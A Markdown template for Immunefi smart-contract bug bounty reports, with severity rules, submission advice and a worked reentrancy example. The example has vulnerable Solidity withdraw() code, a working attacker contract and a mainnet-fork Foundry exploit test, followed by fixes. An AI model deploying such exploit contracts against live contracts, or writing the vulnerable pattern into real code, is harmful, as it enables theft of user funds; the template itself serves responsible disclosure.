# Immunefi Bug Bounty Report Template

<!--
=============================================================================
IMMUNEFI SUBMISSION FORMAT
=============================================================================

PLATFORM RULES (as of 2026):
- Bug bounties are LIVE (against deployed mainnet contracts)
- PoC is MANDATORY for all severities (Critical and High especially)
- Reports go directly to the PROJECT TEAM (not judges)
- Response time: projects have 3 business days to acknowledge
- Payout is negotiated, not automatically awarded
- Immunefi mediates disputes
- You MUST check the program page for: scope, excluded impacts, and
  out-of-scope items BEFORE submitting

SEVERITY DEFINITIONS (Immunefi v2.3):

CRITICAL - Smart Contracts:
  - Direct theft of user funds (at rest, not yield)
  - Direct theft of NFTs
  - Permanent freezing of funds
  - Unauthorized minting of protocol tokens
  - Governance voting manipulation
  - Protocol insolvency
  - Predictable/manipulable RNG affecting outcomes

HIGH - Smart Contracts:
  - Theft of unclaimed yield or royalties
  - Permanent freezing of unclaimed rewards
  - Temporary freezing of funds (>24h for user, >1h for protocol)

MEDIUM - Smart Contracts:
  - Smart contract unable to operate (lacks token funds)
  - Block stuffing for profit
  - Griefing (no profit motive, but causes harm)
  - Theft of gas
  - Unbounded gas consumption

LOW - Smart Contracts:
  - Contract fails to deliver promised returns but doesn't lose value

AUTOMATIC DOWNGRADES/EXCLUSIONS:
  - Requires elevated privileges (admin key) -> usually excluded
  - Requires uncommon user interaction -> may be downgraded
  - Theoretical with no PoC -> rejected
  - Already reported/known -> rejected
  - Out of scope contract -> rejected
-->

# Bug Report: [Verb] + [Impact] + [in Contract/Function]

<!-- TITLE EXAMPLES:
CRITICAL: "Drain all staked ETH via reentrancy in StakingPool.withdraw()"
HIGH:     "Steal unclaimed yield by manipulating reward calculation in Distributor.claim()"
MEDIUM:   "Permanently DoS deposit() via unbounded loop in user array"
LOW:      "Incorrect fee calculation returns less yield than promised"
-->

## Bug Description

<!-- Structure: WHAT -> WHERE -> WHY -> SO WHAT
     Keep this to 3-5 sentences. Get to the point fast.
     Project teams are busy; they read the first paragraph to decide
     whether to keep reading.
-->

A [type of vulnerability] exists in the [`ContractName.functionName()`](link-to-etherscan-or-repo)
function at line XX of the deployed contract at `0x...`. Due to [root cause],
an attacker can [specific action] which results in [specific impact].
At the contract's current balance of $X, this puts approximately $Y at risk.

## Impact

<!-- SEVERITY FRAMING - match Immunefi's exact categories:

FOR CRITICAL, use one of these EXACT phrases:
  - "Direct theft of user funds at rest" -> then quantify
  - "Permanent freezing of funds" -> specify which funds, how much
  - "Protocol insolvency" -> show the math
  - "Unauthorized minting" -> show supply impact

FOR HIGH:
  - "Theft of unclaimed yield" -> quantify annual yield at risk
  - "Temporary freezing of funds for >24 hours" -> show the lock mechanism

FOR MEDIUM:
  - "Griefing attack causing [specific harm]" -> show cost to attacker vs damage
  - "Unbounded gas consumption in [function]" -> show the DoS vector

ALWAYS QUANTIFY:
  1. Current contract balance (check Etherscan/DeBank)
  2. Current TVL (check DefiLlama)
  3. Daily/monthly volume if relevant
  4. Attacker's cost vs profit (ROI)
  5. Number of affected users
-->

**Severity: [Critical/High/Medium/Low]**

**Impact category:** [Direct theft of funds / Permanent freezing / Theft of yield / ...]

**Funds at risk:** $[amount] based on current contract balance of [X ETH/tokens]
at [current price].

**Affected users:** [All depositors / Stakers with unclaimed rewards / ...]

**Attack cost:** [Flash loan fee of ~$X / Minimal gas cost / X ETH upfront capital]

**Attack complexity:** [Single transaction / Requires specific timing / ...]

## Risk Breakdown

| Factor | Assessment |
|--------|-----------|
| Attack complexity | [Low/Medium/High] |
| Privileges required | [None/User-level/Admin] |
| User interaction | [None/Victim must perform action] |
| Funds at risk | $[amount] |
| Attacker profit | $[amount] |
| Affected contracts | [`0x...`](etherscan-link) |

## Vulnerability Details

<!-- Walk through the vulnerability step by step.
     Reference specific line numbers in the deployed contract.
     Use Etherscan-verified source links when possible.

     Structure:
     1. The vulnerable code path
     2. Why the existing checks fail to prevent exploitation
     3. Exactly how an attacker triggers the vulnerability
     4. What state changes occur as a result
-->

### Vulnerable Code

```solidity
// Source: ContractName.sol, lines XX-YY
// Etherscan: https://etherscan.io/address/0x...#code

function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient");
    // BUG: External call before state update
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    balances[msg.sender] -= amount; // <-- Updated AFTER external call
}
```

### Attack Flow

1. Attacker deploys a malicious contract with a `receive()` function that
   re-calls `withdraw()`
2. Attacker deposits 1 ETH to establish a balance
3. Attacker calls `withdraw(1 ether)` from the malicious contract
4. During the ETH transfer, `receive()` triggers and calls `withdraw(1 ether)` again
5. Since `balances[attacker]` hasn't been decremented yet, the check passes
6. This repeats until the vault is drained
7. After all recursive calls return, `balances[attacker]` underflows or is set
   to an incorrect value

## Proof of Concept

<!-- IMMUNEFI POC REQUIREMENTS:
     - MUST be runnable against the LIVE deployed contract
     - Fork mainnet at a recent block
     - Show before/after balances as concrete proof
     - Include the exact commands to run it
     - Attacker contract source must be included
-->

### Environment Setup

```bash
# Required: Foundry installed (https://getfoundry.sh)
# Required: RPC URL for mainnet fork (Alchemy/Infura)

# Create test file
mkdir -p test && cat > test/Exploit.t.sol << 'SOLEOF'
[paste test code below]
SOLEOF

# Run exploit
forge test --match-test test_exploit \
    --fork-url $ETH_RPC_URL \
    --fork-block-number 19500000 \
    -vvv
```

### Exploit Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

// Minimal interface for the target contract
interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract AttackContract {
    IVulnerableContract public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = IVulnerableContract(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }
}

contract ExploitTest is Test {
    // Target: deployed contract address on mainnet
    address constant TARGET = 0x1234567890AbcdEF1234567890aBcDeF12345678;

    IVulnerableContract target;
    AttackContract attackContract;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at recent block
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), 19500000);

        target = IVulnerableContract(TARGET);
        vm.deal(attacker, 2 ether);

        vm.prank(attacker);
        attackContract = new AttackContract(TARGET);
    }

    function test_exploit() public {
        // === STATE BEFORE ===
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console2.log("=== BEFORE ATTACK ===");
        console2.log("Target balance:", targetBalanceBefore / 1e18, "ETH");
        console2.log("Attacker balance:", attackerBalanceBefore / 1e18, "ETH");

        // === EXECUTE ATTACK ===
        vm.prank(attacker);
        attackContract.attack{value: 1 ether}();

        // Withdraw stolen funds from attack contract
        // ... (depends on attack contract implementation)

        // === STATE AFTER ===
        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console2.log("=== AFTER ATTACK ===");
        console2.log("Target balance:", targetBalanceAfter / 1e18, "ETH");
        console2.log("Attacker balance:", attackerBalanceAfter / 1e18, "ETH");
        console2.log("=== PROFIT ===");
        console2.log("Stolen:", (targetBalanceBefore - targetBalanceAfter) / 1e18, "ETH");

        // === ASSERTIONS ===
        assertLt(targetBalanceAfter, targetBalanceBefore, "Target lost funds");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker profited");
    }
}
```

### Expected Output

```
=== BEFORE ATTACK ===
Target balance: 1200 ETH
Attacker balance: 2 ETH
=== AFTER ATTACK ===
Target balance: 0 ETH
Attacker balance: 1202 ETH
=== PROFIT ===
Stolen: 1200 ETH
```

## Recommended Fix

<!-- Show the project team you understand their code well enough to fix it.
     This builds credibility and may influence payout positively. -->

**Root cause:** The `withdraw()` function violates the Checks-Effects-Interactions
pattern by making an external call (ETH transfer) before updating state
(`balances` mapping).

**Option 1: Apply CEI pattern (recommended)**
```diff
  function withdraw(uint256 amount) external {
      require(balances[msg.sender] >= amount, "Insufficient");
+     balances[msg.sender] -= amount;
      (bool success, ) = msg.sender.call{value: amount}("");
      require(success, "Transfer failed");
-     balances[msg.sender] -= amount;
  }
```

**Option 2: Add reentrancy guard**
```diff
+ import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

- contract Vault {
+ contract Vault is ReentrancyGuard {

-     function withdraw(uint256 amount) external {
+     function withdraw(uint256 amount) external nonReentrant {
```

**Recommendation:** Apply both fixes for defense-in-depth.

## References

- [Relevant audit report or post-mortem if similar bug existed elsewhere]
- [EIP or standard being violated, if applicable]
- [Etherscan link to deployed contract]

---

<!--
=============================================================================
COMMON MISTAKES TO AVOID (Immunefi specific)
=============================================================================

1. SUBMITTING AGAINST WRONG CONTRACT: Always verify the contract address
   is listed in the program's "Assets in Scope" section.

2. NO MAINNET FORK POC: "It could theoretically happen" gets rejected.
   Fork mainnet, show the exploit works against live state.

3. ADMIN KEY FINDINGS: Most programs exclude "attacks requiring privileged
   access." Read the program rules carefully.

4. PREVIOUSLY DISCLOSED: Check the program's "known issues," past audit
   reports, and any published post-mortems.

5. OUT-OF-SCOPE IMPACTS: Even if you find a real bug, if the impact type
   isn't listed in the program's scope, it may be rejected. Check the
   "Impacts in Scope" table.

6. VAGUE IMPACT STATEMENTS: "Could lead to loss of funds" without
   quantification. Always include current contract balance and max
   extractable amount.

7. THEORETICAL ATTACKS WITH UNREALISTIC CONDITIONS: "If gas price reaches
   1000 gwei AND the mempool is empty AND the oracle hasn't updated in
   24 hours..." -> rejected.

8. SANDWICH/FRONTRUN WITHOUT PROFIT CALCULATION: Show the MEV math.
   Include gas costs, flashbot tips, and realistic slippage.

9. POOR COMMUNICATION DURING TRIAGE: Immunefi mediates between you and
   the project. Respond promptly, provide clarifications, and be
   professional. Payout can be influenced by communication quality.

10. SUBMITTING DUPLICATES ACROSS PROGRAMS: If the same bug class exists
    in a forked codebase, submit to each program separately with
    program-specific details.
-->
